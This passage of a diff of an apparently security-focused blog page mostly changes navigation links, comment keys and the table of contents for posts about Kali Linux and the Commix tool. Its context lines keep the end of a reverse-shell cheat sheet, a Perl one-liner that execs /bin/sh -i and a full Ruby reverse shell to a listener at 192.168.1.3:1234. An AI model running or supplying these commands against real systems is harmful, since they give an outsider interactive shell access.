class="keyword">connect</span>(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;<span class="keyword">open</span>(STDIN,\”&gt;%26S\”);<span class="keyword">open</span>(STDOUT,\”&gt;%26S\”);<span class="keyword">open</span>(STDERR,\”&gt;%26S\”);<span class="keyword">exec</span>(\”/bin/sh -i\”);&#125;;’</div><div class="line"><span class="number">4</span>. Ruby-<span class="keyword">reverse</span>-shell:</div><div class="line">　　ruby -rsocket -e ‘<span class="keyword">exit</span> <span class="keyword">if</span> <span class="keyword">fork</span>;c=TCPSocket.new(\”<span class="number">192.168</span>.<span class="number">1.3</span>\”,<span class="number">1234</span>);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.<span class="keyword">print</span> io.read&#125;end’</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -460,8 +427,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/01/21/kali-linux-2016-使用指南-二/" rel="next" title="kali linux 2016 使用指南(二)">
-                <i class="fa fa-chevron-left"></i> kali linux 2016 使用指南(二)
+              <a href="/2017/01/21/commix使用示例/" rel="next" title="commix使用示例">
+                <i class="fa fa-chevron-left"></i> commix使用示例
               </a>
             
           </div>
@@ -469,10 +436,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/01/21/commix使用示例/" rel="prev" title="commix使用示例">
-                commix使用示例 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -498,8 +461,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/01/21/基于CSI的移动目标侦测研究学习/"
-           data-title="基于CSI的移动目标侦测研究学习" data-url="http://zer0yu.github.io/2017/01/21/基于CSI的移动目标侦测研究学习/">
+      <div class="ds-thread" data-thread-key="2017/01/21/Commix命令详解/"
+           data-title="Commix命令详解" data-url="http://zer0yu.github.io/2017/01/21/Commix命令详解/">
       </div>
     
   </div>
@@ -635,7 +598,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境安装"><span class="nav-number">1.</span> <span class="nav-text">环境安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取数据"><span class="nav-number">2.</span> <span class="nav-text">获取数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取数据"><span class="nav-number">3.</span> <span class="nav-text">读取数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境安装-1"><span class="nav-number"></span> <span class="nav-text">环境安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据-1"><span class="nav-number"></span> <span class="nav-text">获取数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取数据-1"><span class="nav-number"></span> <span class="nav-text">读取数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#数据预处理"><span class="nav-number">1.</span> <span class="nav-text">数据预处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考论文"><span class="nav-number">2.</span> <span class="nav-text">参考论文</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用"><span class="nav-number">2.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例子"><span class="nav-number">3.</span> <span class="nav-text">例子</span></a></li></ol></div>
             
 
           </div>
